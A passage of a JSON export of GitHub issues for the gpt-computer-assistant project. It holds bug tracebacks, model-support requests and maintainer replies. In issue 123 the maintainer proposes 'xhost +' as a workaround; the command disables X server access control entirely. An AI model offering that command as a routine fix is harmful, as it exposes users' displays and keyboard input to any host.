+      "body": "Error after adding my gemini API key and trying to do a simple prompt \"test\" and clicking send:\r\n\r\nHISTORY DB C:\\Python312\\Lib\\site-packages\\gpt_computer_assistant\\utils\\artifacts\\history_default.db\r\nC:\\Python312\\Lib\\site-packages\\langchain_community\\chat_message_histories\\sql.py:141: LangChainDeprecationWarning: `connection_string` was deprecated in LangChain 0.2.2 and will be removed in 0.3.0. Use Use connection instead instead.\r\n  warn_deprecated(\r\nLLM INPUT test\r\nHISTORY DB C:\\Python312\\Lib\\site-packages\\gpt_computer_assistant\\utils\\artifacts\\history_default.db\r\nError in process_text 'type'\r\nTraceback (most recent call last):\r\n  File \"C:\\Python312\\Lib\\site-packages\\gpt_computer_assistant\\agent\\process.py\", line 220, in process_text\r\n    llm_output = assistant(\r\n                 ^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\gpt_computer_assistant\\agent\\assistant.py\", line 177, in assistant\r\n    msg = get_agent_executor().invoke(\r\n          ^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\gpt_computer_assistant\\agent\\agent.py\", line 63, in get_agent_executor\r\n    return chat_agent_executor.create_tool_calling_executor(get_model(), tools)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\langgraph\\prebuilt\\chat_agent_executor.py\", line 369, in create_react_agent\r\n    model = model.bind_tools(tool_classes)\r\n            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\langchain_google_genai\\chat_models.py\", line 966, in bind_tools\r\n    genai_tools = [tool_to_dict(convert_to_genai_function_declarations(tools))]\r\n                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\langchain_google_genai\\_function_utils.py\", line 65, in convert_to_genai_function_declarations\r\n    return convert_to_genai_function_declarations({\"function_declarations\": tool})\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\langchain_google_genai\\_function_utils.py\", line 69, in convert_to_genai_function_declarations\r\n    _convert_to_genai_function(fc) for fc in tool[\"function_declarations\"]\r\n    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\langchain_google_genai\\_function_utils.py\", line 105, in _convert_to_genai_function\r\n    return _convert_tool_to_genai_function(fc)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"C:\\Python312\\Lib\\site-packages\\langchain_google_genai\\_function_utils.py\", line 139, in _convert_tool_to_genai_function\r\n    \"type_\": TYPE_ENUM[v[\"type\"]],\r\n                       ~^^^^^^^^\r\nKeyError: 'type'\r\nUpdating from thread EXCEPTION: 'type'\r\nState updated: idle\r\n\r\nOS: Win11",
+      "state": "closed",
+      "author": "datrip",
+      "author_type": "User",
+      "created_at": "2024-06-12T15:00:31Z",
+      "updated_at": "2024-12-11T21:38:26Z",
+      "closed_at": "2024-12-11T21:38:26Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/129/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/129",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/129",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:57.892890",
+      "comments": []
+    },
+    {
+      "issue_number": 35,
+      "title": "Add Qwen-VL model?",
+      "body": "Qwen-VL ([ArXiv](https://arxiv.org/abs/2308.12966), [GitHub](https://github.com/QwenLM/Qwen-VL), [HugingFace](https://huggingface.co/Qwen/Qwen-VL)) shows very promising results on various tasks, would it be possible to add it to the project or at least consider it?\r\n\r\nI have not read the full source code, but from what I've seen it should be pretty straight forward, I could probably do it when I've a bit of time.",
+      "state": "closed",
+      "author": "brayevalerien",
+      "author_type": "User",
+      "created_at": "2024-06-05T14:55:15Z",
+      "updated_at": "2024-12-11T20:45:06Z",
+      "closed_at": "2024-12-11T20:45:05Z",
+      "labels": [
+        "new_model"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/35/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/35",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/35",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:57.892912",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hi, thank you so much. I will make researches about it. Maybe gpt-computer-assistant will research =)",
+          "created_at": "2024-06-05T15:19:19Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 101,
+      "title": "Add Ollama Custom Model for Fine Tunes",
+      "body": "@nessystudio",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-09T01:00:11Z",
+      "updated_at": "2024-12-11T20:44:33Z",
+      "closed_at": "2024-12-11T20:44:33Z",
+      "labels": [
+        "improvement",
+        "new_model"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/101/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/101",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/101",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:58.081456",
+      "comments": []
+    },
+    {
+      "issue_number": 202,
+      "title": "(PYL-R0401) Cyclic import found",
+      "body": "## Description\r\nCyclic imports shall be avoided. Read why are they fatal [here](https://datagrok.org/python/circularimports/).\r\n\r\n## Occurrences\r\nThere are 21 occurrences of this issue in the repository.\r\n\r\nSee all occurrences on DeepSource &rarr; [app.deepsource.com/gh/onuratakan/gpt-computer-assistant/issue/PYL-R0401/occurrences/](https://app.deepsource.com/gh/onuratakan/gpt-computer-assistant/issue/PYL-R0401/occurrences/)\r\n",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-25T19:51:47Z",
+      "updated_at": "2024-12-11T20:44:11Z",
+      "closed_at": "2024-12-11T20:44:11Z",
+      "labels": [
+        "help wanted",
+        "good first issue"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/202/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/202",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/202",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:58.081479",
+      "comments": []
+    },
+    {
+      "issue_number": 176,
+      "title": "Invalid 'tools': array too long. ",
+      "body": "{'error': {'message': \"Invalid 'tools': array too long. Expected an array with maximum length 128, but got an array with length 133 instead.\", 'type': 'invalid_request_error',",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-19T20:15:25Z",
+      "updated_at": "2024-06-19T20:22:09Z",
+      "closed_at": "2024-06-19T20:22:09Z",
+      "labels": [
+        "bug"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/176/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/176",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/176",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:32:59.868952",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "There is an bug that i found, our tool amount increases for each call. Just a list problem in here.",
+          "created_at": "2024-06-19T20:15:56Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 123,
+      "title": "Xlib.error.DisplayConnectionError: Can't connect to display \":0\": b'Authorization required, but no authorization protocol specified\\n'",
+      "body": "Eror:\r\nTraceback (most recent call last):\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/bin/computerassistant\", line 5, in <module>\r\n    from gpt_computer_assistant.start import start\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/gpt_computer_assistant/__init__.py\", line 5, in <module>\r\n    from .tooler import Tool\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/gpt_computer_assistant/tooler.py\", line 5, in <module>\r\n    from .agent.agent import custom_tools\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/gpt_computer_assistant/agent/__init__.py\", line 2, in <module>\r\n    from .assistant import *\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/gpt_computer_assistant/agent/assistant.py\", line 11, in <module>\r\n    from ..screen.shot import *\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/gpt_computer_assistant/screen/shot.py\", line 2, in <module>\r\n    import pyautogui\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/pyautogui/__init__.py\", line 246, in <module>\r\n    import mouseinfo\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/mouseinfo/__init__.py\", line 223, in <module>\r\n    _display = Display(os.environ['DISPLAY'])\r\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/Xlib/display.py\", line 80, in __init__\r\n    self.display = _BaseDisplay(display)\r\n                   ^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/Xlib/display.py\", line 62, in __init__\r\n    display.Display.__init__(*(self, ) + args, **keys)\r\n  File \"/home/dukhanin/venvs/gpt-computer-assistant/lib/python3.12/site-packages/Xlib/protocol/display.py\", line 129, in __init__\r\n    raise error.DisplayConnectionError(self.display_name, r.reason)\r\nXlib.error.DisplayConnectionError: Can't connect to display \":0\": b'Authorization required, but no authorization protocol specified\\n'\r\n\r\nOS: ubuntu 24, using venv\r\n",
+      "state": "closed",
+      "author": "bukhanka",
+      "author_type": "User",
+      "created_at": "2024-06-11T22:23:05Z",
+      "updated_at": "2024-06-18T04:28:04Z",
+      "closed_at": "2024-06-18T04:28:04Z",
+      "labels": [
+        "bug",
+        "ubuntu"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 3,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/123/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/123",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/123",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:00.085096",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Oh hi, there is an workarround for now:\r\n\r\n```\r\nxhost +\r\n```",
+          "created_at": "2024-06-14T23:02:17Z"
+        },
+        {
+          "author": "bukhanka",
+          "body": "> xhost +\r\n\r\nIt wroked, thanks! got another error now.. :'-(\r\n",
+          "created_at": "2024-06-18T04:27:42Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 159,
+      "title": "Adding API to trigging remotely",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-16T10:19:36Z",
+      "updated_at": "2024-06-16T13:20:27Z",
+      "closed_at": "2024-06-16T13:20:27Z",
+      "labels": [
+        "help wanted",
+        "improvement"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/159/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/159",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/159",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:00.288278",
+      "comments": []
+    },
+    {
+      "issue_number": 82,
+      "title": "Please add llava-phi3",
+      "body": "Can you please add the llava-phi3 model when using Ollama?",
+      "state": "closed",
+      "author": "razvanab",
+      "author_type": "User",
+      "created_at": "2024-06-07T11:49:05Z",
+      "updated_at": "2024-06-10T16:15:32Z",
+      "closed_at": "2024-06-10T16:15:32Z",
+      "labels": [
+        "improvement",
+        "new_model"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/82/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/82",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/82",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:00.288363",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Really good suggestion. We will add.",
+          "created_at": "2024-06-07T12:14:27Z"
+        },
+        {
+          "author": "razvanab",
+          "body": "Thank you",
+          "created_at": "2024-06-07T12:31:56Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 87,
+      "title": "Add llama3 integration ?",
+      "body": "are you going to add llama3 ?",
+      "state": "closed",
+      "author": "psikosen",
+      "author_type": "User",
+      "created_at": "2024-06-07T22:02:37Z",
+      "updated_at": "2024-06-10T16:11:32Z",
+      "closed_at": "2024-06-10T16:11:32Z",
+      "labels": [
+        "improvement",
+        "new_model"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/87/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/87",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/87",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:01.957820",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Yeah, actualy we should, we will.",
+          "created_at": "2024-06-07T22:26:54Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "see : #111 ",
+          "created_at": "2024-06-10T08:27:45Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 84,
+      "title": "Adding Gemini 1.5-Pro/Flash",
+      "body": "Hi, any plans to add Google's LLMs? Both are multimodal and have a very useful free tier for the API, so a lot of people use it. ",
+      "state": "closed",
+      "author": "datrip",
+      "author_type": "User",
+      "created_at": "2024-06-07T14:27:54Z",
+      "updated_at": "2024-06-10T16:11:32Z",
+      "closed_at": "2024-06-10T16:11:31Z",
+      "labels": [
+        "improvement",
+        "new_model"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 4,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/84/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/84",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/84",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:02.205568",
+      "comments": [
+        {
+          "author": "Mideky-hub",
+          "body": "Yes sure, just wrote a universal backend dictionary for adding AI models to the assistant. It will be made shortly!",
+          "created_at": "2024-06-07T14:56:45Z"
+        },
+        {
+          "author": "Merlinvt",
+          "body": "I think providing the ability to specify your own model with a base URL would open up many possibilities. You could use OpenRouter or a similar service and access models like Gemini, Claude, or any other model you want for the same price.\r\n\r\nSure, having a lightllm implementation would make this pos",
+          "created_at": "2024-06-09T20:28:16Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "Sure, I'll work on it, but in the meantime we'll have a parallel implementation of an hardcoded model implementation, in less than a week a custom selection model will be able to be done by the user  ",
+          "created_at": "2024-06-10T08:30:14Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "See #111 ",
+          "created_at": "2024-06-10T08:40:38Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 100,
+      "title": "Write docstrings for functions",
+      "body": null,
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-09T00:45:21Z",
+      "updated_at": "2024-06-09T10:34:22Z",
+      "closed_at": "2024-06-09T10:34:22Z",
+      "labels": [
+        "help wanted"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/100/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/100",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/100",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:02.408873",
+      "comments": [
+        {
+          "author": "KramStyles",
+          "body": "Added docstring for bump.py @onuratakan ",
+          "created_at": "2024-06-09T10:22:28Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 70,
+      "title": "Chat Gpt Model",
+      "body": "Great work of code!!! But I don't have a Chat-gpt4o api key and it's giving me errors when I connect to using the 3.5 version api",
+      "state": "closed",
+      "author": "divinefavourak",
+      "author_type": "User",
+      "created_at": "2024-06-07T03:35:06Z",
+      "updated_at": "2024-06-07T17:57:14Z",
+      "closed_at": "2024-06-07T17:57:14Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 0,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/70/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/70",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/70",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:02.623429",
+      "comments": []
+    },
+    {
+      "issue_number": 23,
+      "title": "some depdency is missing and cannot install per README.md",
+      "body": "# Errors with installtion:\r\n\r\n\r\n> C:\\Users\\jeffrey>pip3 install gpt-computer-assistant                                                                        WARNING: pip is being invoked by an old script wrapper. This will fail in a future version of pip.                          Please see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.                               To avoid this problem you can invoke Python with '-m pip' instead of running pip directly.                                  Defaulting to user installation because normal site-packages is not writeable                                               Collecting gpt-computer-assistant                                                                                             Downloading gpt_computer_assistant-0.6.12.tar.gz (163 kB)                                                                      |████████████████████████████████| 163 kB 163 kB/s                                                                     ERROR: Could not find a version that satisfies the requirement langgraph==0.0.55 (from gpt-computer-assistant) (from ver    sions: 0.0.8)                                                                                                               ERROR: No matching distribution found for langgraph==0.0.55 (from gpt-computer-assistant)     \r\n\r\nafter install `langgraph` with command `pip3 install langgraph==0.0.55`, a new error occurred as follows:\r\n\r\n\r\n> C:\\Users\\jeffrey>pip3 install gpt-computer-assistant                                                                \r\n> WARNING: pip is being invoked by an old script wrapper. This will fail in a future version of pip.                          Please see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.                               To avoid this problem you can invoke Python with '-m pip' instead of running pip directly.                                  Defaulting to user installation because normal site-packages is not writeable                                               WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'Prox    yError('Cannot connect to proxy.', OSError(0, 'Error'))': /simple/gpt-computer-assistant/                                   WARNING: Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'Prox    yError('Cannot connect to proxy.', OSError(0, 'Error'))': /simple/gpt-computer-assistant/                                   WARNING: Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'Prox    yError('Cannot connect to proxy.', OSError(0, 'Error'))': /simple/gpt-computer-assistant/                                   WARNING: Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'Prox    yError('Cannot connect to proxy.', OSError(0, 'Error'))': /simple/gpt-computer-assistant/                                   WARNING: Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'Prox    yError('Cannot connect to proxy.', OSError(0, 'Error'))': /simple/gpt-computer-assistant/                                   ERROR: Could not find a version that satisfies the requirement gpt-computer-assistant==0.6.12 (from versions: none)         ERROR: No matching distribution found for gpt-computer-assistant==0.6.12 \r\n\r\n                                                                                                                                                                               \r\n\r\n\r\nrun command `pip3 install gpt-computer-assistant==0.6.12` to install but still with above error.\r\n\r\n\r\n# Enviroment:\r\n\r\n> system: Win10\r\n> \r\n> C:\\Users\\jeffrey>pip --version\r\n> WARNING: pip is being invoked by an old script wrapper. This will fail in a future version of\r\n> Please see https://github.com/pypa/pip/issues/5599 for advice on fixing the underlying issue.\r\n> To avoid this problem you can invoke Python with '-m pip' instead of running pip directly.\r\n> pip 24.0 from C:\\Users\\jeffrey\\AppData\\Roaming\\Python\\Python38\\site-packages\\pip (python 3.8)\r\n\r\n\r\n",
+      "state": "closed",
+      "author": "double12gzh",
+      "author_type": "User",
+      "created_at": "2024-06-04T15:12:15Z",
+      "updated_at": "2024-06-07T01:37:09Z",
+      "closed_at": "2024-06-07T01:37:09Z",
+      "labels": [
+        "bug",
+        "python_version"
+      ],
+      "label_count": 2,
+      "has_labels": true,
+      "comments_count": 3,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/23/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/23",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/23",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:02.623453",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Hmm, it seems about your python version, can you upgrade you python version to 3.12?",
+          "created_at": "2024-06-04T15:54:54Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Hi, again, i just made a update and we just currently support >= 3.9",
+          "created_at": "2024-06-04T18:00:37Z"
+        },
+        {
+          "author": "double12gzh",
+          "body": "Great! It works well after upgrading my python version.",
+          "created_at": "2024-06-07T01:37:09Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 29,
+      "title": "Adding support to groq",
+      "body": "              Hello ! It would be cool to use groq api so that it will run a lot faster than openai or ollama (and it's free).\r\n\r\n_Originally posted by @guepardlover77 in https://github.com/onuratakan/gpt-computer-assistant/issues/19#issuecomment-2146717808_\r\n            ",
+      "state": "closed",
+      "author": "onuratakan",
+      "author_type": "User",
+      "created_at": "2024-06-05T06:02:07Z",
+      "updated_at": "2024-06-05T23:48:10Z",
+      "closed_at": "2024-06-05T23:48:10Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 5,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/29/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/29",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/29",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:02.837981",
+      "comments": [
+        {
+          "author": "Mideky-hub",
+          "body": "Hey! That would be awesome, I'll put a PR soon for this!",
+          "created_at": "2024-06-05T08:10:20Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "Can we assign me to this one?\r\n",
+          "created_at": "2024-06-05T08:11:02Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "Hey yeah, why not. Please.",
+          "created_at": "2024-06-05T15:23:41Z"
+        },
+        {
+          "author": "onuratakan",
+          "body": "We are fully open to contributions. Its our agents your and mine.",
+          "created_at": "2024-06-05T15:24:04Z"
+        },
+        {
+          "author": "Mideky-hub",
+          "body": "Perfect!",
+          "created_at": "2024-06-05T16:11:34Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 26,
+      "title": "Icons on black circles to make it clear",
+      "body": "Nice minimalist interface, but I'd like to see icons in the circles (so like a mic and a display for mic+screenshot and so on).\r\nThank you!",
+      "state": "closed",
+      "author": "paaspaas00",
+      "author_type": "User",
+      "created_at": "2024-06-04T21:12:04Z",
+      "updated_at": "2024-06-05T15:52:47Z",
+      "closed_at": "2024-06-05T15:52:47Z",
+      "labels": [
+        "gui"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 1,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/26/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/26",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/26",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:03.061339",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "So true, and i will.",
+          "created_at": "2024-06-05T05:56:10Z"
+        }
+      ]
+    },
+    {
+      "issue_number": 27,
+      "title": "Allow setting a local API or hosted API",
+      "body": "Allow setting a local API so we can use local development models or self-hosted models.",
+      "state": "closed",
+      "author": "funkytaco",
+      "author_type": "User",
+      "created_at": "2024-06-05T04:35:29Z",
+      "updated_at": "2024-06-05T14:19:22Z",
+      "closed_at": "2024-06-05T14:19:22Z",
+      "labels": [
+        "improvement"
+      ],
+      "label_count": 1,
+      "has_labels": true,
+      "comments_count": 2,
+      "reactions": {
+        "url": "https://api.github.com/repos/Upsonic/Upsonic/issues/27/reactions",
+        "total_count": 0,
+        "+1": 0,
+        "-1": 0,
+        "laugh": 0,
+        "hooray": 0,
+        "confused": 0,
+        "heart": 0,
+        "rocket": 0,
+        "eyes": 0
+      },
+      "assignees": [
+        "onuratakan"
+      ],
+      "milestone": null,
+      "html_url": "https://github.com/Upsonic/Upsonic/issues/27",
+      "api_url": "https://api.github.com/repos/Upsonic/Upsonic/issues/27",
+      "repository": "Upsonic/Upsonic",
+      "extraction_date": "2025-06-22T00:33:03.237301",
+      "comments": [
+        {
+          "author": "onuratakan",
+          "body": "Okey, but with local modules we cannot able to use screenshot, microphone, and voice. Is there any good local models. Maybe phi3?",
+          "created_at": "2024-06-05T05:57:25Z"
+        },
+        {
+          "author": "onuratakan",
